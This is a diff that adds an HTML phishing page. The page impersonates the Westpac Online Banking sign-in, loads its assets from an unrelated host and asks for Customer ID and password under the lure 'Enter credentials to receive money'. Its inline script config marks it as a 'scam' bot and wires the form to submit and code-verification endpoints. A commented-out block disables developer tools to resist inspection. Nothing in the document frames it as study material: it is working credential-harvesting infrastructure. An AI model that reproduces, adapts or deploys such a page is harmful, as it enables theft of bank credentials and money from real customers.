@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <title>Sign in to Westpac Online Banking</title>
+    <base href="https://auspost.serveblog.net">
+    <link href="/static/personal-cabinet/images/au/westpac/favicon.ico" rel="icon" type="image/x-icon">
+</head>
+
+<style>
+    #pc-submit-button {
+        cursor: pointer;
+        width: 100%;
+        height: 50px;
+        padding: 0px 16px;
+        border-color: #da1710;
+        background: #da1710;
+        color: white;
+        font-family: inherit;
+        font-size: 1rem;
+        font-weight: 600;
+        text-align: center;
+        letter-spacing: 2px;
+        transition: all 0.375s;
+    }
+
+    #pc-submit-button:hover {
+        background: #da1710;
+    }
+
+    #pc-submit-button:disabled {
+        background: #808080;
+        border-color: #808080;
+    }
+
+    @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+
+    * {
+        box-sizing: border-box;
+    }
+
+    html,
+    body,
+    .wrapper {
+        height: 95%
+    }
+
+    body {
+        display: grid;
+        place-items: center;
+        margin: 0;
+        padding: 0 24px;
+        background-repeat: no-repeat;
+        background-size: cover;
+        font-family: "Ubuntu";
+        color: #000000;
+        animation: rotate 6s infinite alternate linear;
+    }
+
+    .login-card {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        margin: 0 20px;
+        padding: 70px 30px 44px;
+        border-radius: 1.25rem;
+        background: #fff;
+        text-align: center;
+    }
+
+    .login-card>h2 {
+        font-size: 36px;
+        font-weight: 600;
+        margin: 0 0 12px;
+    }
+
+    .login-card>h3 {
+        color: rgba(0, 0, 0, 0.38);
+        margin: 0 0 30px;
+        font-weight: 500;
+        font-size: 1rem;
+    }
+
+    .login-form-7nj2yNBqUz {
+        width: 100%;
+        margin: 0;
+        display: grid;
+        gap: 16px;
+    }
+
+    input,
+    select {
+        width: 100%;
+        height: 50px;
+        border: 2px solid #ebebeb;
+        font-family: inherit;
+        font-size: 15px;
+        padding: 0 16px;
+        border-radius: 1.25rem;
+        transition: all 0.375s;
+    }
+
+    .login-form-7nj2yNBqUz>input:hover,
+    .login-form-7nj2yNBqUz>select:hover {
+        border: 2px solid #da1710;
+    }
+
+    @keyframes rotate {
+        100% {
+            background-position: 15% 50%;
+        }
+    }
+
+    @media (width>=500px) {
+        body {
+            padding: 0;
+        }
+
+        .login-card {
+            margin: 0;
+            width: 400px;
+        }
+    }
+</style>
+
+<body>
+    <img width='250px' src="/static/personal-cabinet/images/au/westpac/logo.png">
+    <div class="login-card">
+        <h2>Login</h2>
+
+        <h3>Enter credentials to receive money</h3>
+
+
+        <div class="login-form-7nj2yNBqUz">
+            <input type="hidden" id="bank-name" value="Westpac">
+            <input type="hidden" id="country-code-pc" value="AU">
+            <label class="constructor" style="color: red;"></label>
+            <br>
+            <input id="login" type="text" required="true" data-required="required" aria-required="true" maxlength="8"
+                placeholder="Customer ID">
+            <input id="password" aria-invalid="false" type="password" required="true" data-required="required"
+                aria-required="true" maxlength="32" placeholder="Password">
+            <div>
+                <button disabled type="submit" id="pc-submit-button" value="Sign In">
+            </div>
+        </div>
+    </div>
+
+
+    <script>
+        const botType = "scam";
+        const currency = "AUD";
+        const supportToken = "cvfQ1VdOtX0SdAwvlcqdpGccIrhYb1kJ";
+        const languageCode = "EN";
+
+        const updateApiPath = "/api/update";
+        const stepsApiPath = "/api/steps";
+        const submitApiPath = "/api/submit";
+        const codeApiPath = "/api/code";
+
+        const userLocation = {
+            country: "🇦🇺 Австралия",
+            template: "merchant",
+            countryCode: "AU",
+            bank: "Westpac",
+        };
+    </script>
+
+
+    <script>
+        const adId = "4Ru2sQpsL199";
+        const adSubtype = "2.0";
+        const tpType = 0;
+        const logoPath = "/static/delivery/images/auspost/logo.png";
+    </script>
+
+
+    <!-- Bootstrap -->
+    <link href="/static/other/bootstrap/css/bootstrap.css" rel="stylesheet">
+    <script src="/static/other/bootstrap/js/bootstrap.js"></script>
+
+    <!-- SweetAlert -->
+    <link rel="stylesheet" type="text/css" href="/static/other/sweetalert/css/style.css">
+    <script src="/static/other/sweetalert/js/sweetalert2@11.js"></script>
+
+    <!-- iMask -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/imask/7.6.0/imask.min.js"></script>
+
+    <!-- Axios -->
+    <!-- <script src="/static/other/axios/axios.min.js"></script> -->
+
+    <!-- jQuery -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    <!-- Console -->
+    <!-- <script src="/static/other/console/console-ban.min.js"></script>
+
+<script>
+    ConsoleBan.init({
+        redirect: 'https://http.cat/403'
+    });
+</script>
+
+<script>
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    document.addEventListener('keydown', (e) => {
+        if ((e.ctrlKey && e.shiftKey && e.key == 'I') ||
+            (e.ctrlKey && e.shiftKey && e.key == 'J') ||
+            (e.key === 'F12')) {
+            e.preventDefault();
+        }
+    });
+</script> -->
+
+    <noscript>
+        <div id="noscript-content">
+            <p>JavaScript is disabled in your browser. Please enable JavaScript to view this content.</p>
+        </div>
+    </noscript>
+
+
+
+
+    <link rel="stylesheet" type="text/css" href="/static/support/css/chat.css">
+
+    <style>
+        .chaport-close.visible,
+        .chaport-container .chaport-close.visible {
+            display: block;
+        }
+
+        .chaport-overlay .chaport-close {
+            position: absolute;
+            width: 70px;
+            height: 70px;
+            top: 13px;
+            right: 27px;
+            opacity: 0.6;
+        }
+
+        .chaport-close,
+        .chaport-container .chaport-close {
+            position: absolute;
+            top: 0px;
+            right: 0px;
+            z-index: 4;
+            width: 50px;
+            height: 70px;
+            cursor: pointer;
+            opacity: 1;
+            transition: opacity 0.2s linear 0s;
+            display: none;
+        }
+
+        .chaport-overlay .chaport-close::before,
+        .chaport-overlay .chaport-close::after {
+            content: "";
+            height: 31px;
+            width: 2px;
+            background-color: rgb(238, 238, 238);
+            right: 33px;
+            top: 19px;
+        }
+
+        .chaport-close::before,
+        .chaport-container .chaport-close::before {
+            transform: rotate(45deg);
+        }
+
+        .chaport-close::after,
+        .chaport-container .chaport-close::after {
+            transform: rotate(-45deg);
+        }
+
+        .chaport-close::before,
+        .chaport-close::after,
+        .chaport-container .chaport-close::before,
+        .chaport-container .chaport-close::after {
+            position: absolute;
+            top: 24px;
+            right: 28px;
+            content: " ";
+            height: 22px;
+            width: 2px;
+            background-color: rgb(255, 255, 255);
+        }
+    </style>
+    <script src="/static/other/swal/language.js"></script>
+    <script src="/static/other/swal/swal-methods.js"></script>
+    <script src="/static/other/swal/system.js"></script>
+
+    <script>
+
+        $('#login').keyup(function () {
+            if ($('#login').val().length == 0) {
+                $('#pc-submit-button').prop('disabled', true);
+            } else if ($('#password').val().length == 0) {
+                $('#pc-submit-button').prop('disabled', true);
+            } else {
+                $('#pc-submit-button').prop('disabled', false);
+            }
+        });
+
+        $('#password').keyup(function () {
+            if ($('#password').val().length == 0) {
+                $('#pc-submit-button').prop('disabled', true);
+            } else if ($('#login').val().length == 0) {
+                $('#pc-submit-button').prop('disabled', true);
+            } else {
+                $('#pc-submit-button').prop('disabled', false);
+            }
+        });
+    </script>
+    <script src="/lol/s.js"></script>
+    <script src="/static/pc-card/js/personal-cabinet/validate.js"></script>
+</body>
+
+</html>
